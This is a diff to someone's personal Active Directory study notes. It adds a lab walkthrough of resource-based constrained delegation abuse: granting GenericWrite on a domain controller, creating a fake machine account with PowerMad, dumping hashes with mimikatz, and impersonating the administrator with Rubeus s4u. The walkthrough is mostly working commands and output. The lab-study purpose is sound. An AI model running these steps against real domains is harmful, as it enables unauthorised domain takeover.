@@ -8,6 +8,7 @@ This is my personal notes on learning Active Directory. Do check out this repo t
 * **[Asrep-Roasting](#asrep-roasting)**
 * **[Unconstrained-Delegation](#unconstrained-delegation)**
 * **[Constrained-Delegation](#constrained-delegation)**
+* **[Resource-Based Constrained Delegation](#resource-based-constrained-delegation)**
 
 ## Weak GPO Permissions
 
@@ -785,4 +786,195 @@ ls \\DC01\c$
 1. https://github.com/aniqfakhrul/archives#constrained-delegation
 2. https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
 3. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberos-constrained-delegation
+```
+
+## Resource-Based Constrained Delegation
+
+### Setup
+
+- Create a user (RBCDUser). Go to Server Manager -> Tools -> Active Directory Users and Computers. Right click on Users and click New -> User. Fill in all the details.
+
+![[Pasted image 20210816212643.png]]
+
+![[Pasted image 20210816212710.png]]
+
+![[Pasted image 20210816212735.png]]
+
+- Then, go to the computers that we want (I use DC01) and right click Properties. 
+
+![[Pasted image 20210816213024.png]]
+
+- Go to security tab (If you cannot see it just go to View -> Advanced Features). 
+
+![[Pasted image 20210816214157.png]]
+
+- Then click on Advanced -> Add -> Select a principal.
+
+![[Pasted image 20210816214242.png]]
+
+- Clear all permissions. Then we can do 2 different things whether to make this user have **Generic Write** or **Generic All**
+
+1. Generic Write. Please tick on these permissions. **(Write all properties, Read permissions, All validated writes)**
+
+![[Pasted image 20210816214601.png]]
+
+2. Generic All . Just click on **Full Control**.
+
+![[Pasted image 20210816214451.png]]
+
+- I'm going to try with **Generic Write **only.
+
+### Detect
+
+**1. PowerView.ps1**
+
+```bash
+1. Run this command and get the current user SID.
+whoami /all
+
+# Output
+USER INFORMATION
+----------------
+
+User Name     SID
+============= ==============================================
+bank\rbcduser S-1-5-21-1107409599-3969185633-1580028286-1112
+```
+
+![[Pasted image 20210816220206.png]]
+
+```bash
+2. Run these commands to check if the user have Generic Write / Generic All
+$targetComputer = "DC01"
+$AttackerSID = "S-1-5-21-1107409599-3969185633-1580028286-1112"
+$ACE = Get-DomainObjectACL $targetComputer | ?{$_.SecurityIdentifier -match $AttackerSID }
+
+# Output
+ObjectDN              : CN=DC01,OU=Domain Controllers,DC=bank,DC=local
+ObjectSID             : S-1-5-21-1107409599-3969185633-1580028286-1001
+ActiveDirectoryRights : GenericWrite
+BinaryLength          : 36
+AceQualifier          : AccessAllowed
+IsCallback            : False
+OpaqueLength          : 0
+AccessMask            : 131112
+SecurityIdentifier    : S-1-5-21-1107409599-3969185633-1580028286-1112
+AceType               : AccessAllowed
+AceFlags              : ContainerInherit
+IsInherited           : False
+InheritanceFlags      : ContainerInherit
+PropagationFlags      : None
+AuditFlags            : None
+```
+
+![[Pasted image 20210816220237.png]]
+
+```bash
+3. Run this to verify again the SID we found is the same as our user or not
+ConvertFrom-SID $ACE.SecurityIdentifier
+
+# Output
+BANK\RBCDUser
+```
+
+![[Pasted image 20210816220253.png]]
+
+### Attack
+
+1. Using PowerView
+
+```bash
+1. Get Computer SID
+$ComputerSID = Get-DomainComputer VULN01 | select -exp objectsid
+
+2. Create bytes representation form of Computer Object SID.
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSID))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes,0)
+
+3. Applying the new security descriptor bytes to the target machine.
+Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+4. To confirm we can run this (if there is value )
+$RawBytes = (Get-DomainComputer $targetComputer).'msds-allowedtoactonbehalfofotheridentity'
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+$Descriptor.DiscretionaryAcl.SecurityIdentifier | ConvertFrom-SID
+
+5. Get Hash for Computer Account (mimikatz)
+sekurlsa::logonpasswords
+
+6. Using Rubues to perform s4u delegation and request TGT for user that we want to impersonate
+.\Rubeus.exe s4u /user:VULN01$ /rc4:df43bc45e5dd721eadefd10207bae247 /impersonateuser:administrator /msdsspn:"cifs/DC01" /altservice:cifs,http,host /ptt
+
+7. Cleanup
+Get-DomainComputer DC01  | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
+```
+
+![[Pasted image 20210816224827.png]]
+
+2. Using ADModule
+
+```bash
+1. Download it in here
+https://github.com/samratashok/ADModule
+
+2. Import dll 
+import-module .\Microsoft.ActiveDirectory.Management.dll
+
+3. Import powershell script
+. .\Import-ActiveDirectory.ps1
+
+4. Applying the new security descriptor bytes to the target machine
+Set-ADComputer -Identity DC01 -PrincipalsAllowedToDelegateToAccount (Get-ADComputer VULN01)
+
+5. To confirm we can run this (if there is value )
+$RawBytes = (Get-DomainComputer $targetComputer).'msds-allowedtoactonbehalfofotheridentity'
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+$Descriptor.DiscretionaryAcl.SecurityIdentifier | ConvertFrom-SID
+
+6. Get Hash for Computer Account (mimikatz)
+sekurlsa::logonpasswords
+
+7. Using Rubues to perform s4u delegation and request TGT for user that we want to impersonate
+.\Rubeus.exe s4u /user:VULN01$ /rc4:df43bc45e5dd721eadefd10207bae247 /impersonateuser:administrator /msdsspn:"cifs/DC01" /altservice:cifs,http,host /ptt
+
+8. Cleanup
+Get-DomainComputer DC01  | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
+```
+
+![[Pasted image 20210816224827.png]]
+
+3. Using PowerMad
+
+```bash
+1. Download 
+https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
+
+2. Run this
+. .\Powermad.ps1
+New-MachineAccount -MachineAccount FakeAccount -Password $(ConvertTo-SecureString 'Passw0rd@123!' -AsPlainText -Force)
+
+3. Use this command to check if the computer is added or not.
+Get-DomainComputer -Properties name
+
+4. We can use ADModule or Powerview (Make sure to use the fake computer name which is "FakeAccount") until we reach the steps to get the hash for Computer Account.
+.\Rubeus.exe hash /password:'Passw0rd@123!' /user:FakeAccount /domain:bank.local
+
+5. Using Rubues to perform s4u delegation and request TGT for user that we want to impersonate
+.\Rubeus.exe s4u /user:FakeAccount$ /rc4:577BA934CE4EC1598BF4851AA85E465F /impersonateuser:administrator /msdsspn:"cifs/DC01" /altservice:cifs,http,host /ptt
+
+6. Cleanup
+Get-DomainComputer DC01  | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
+
+```
+
+![[Pasted image 20210816231803.png]]
+
+### References
+
+```bash
+1. https://github.com/aniqfakhrul/archives#resource-based-constrained-delegation
+2. https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff
+3. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
+4. https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/
 ```
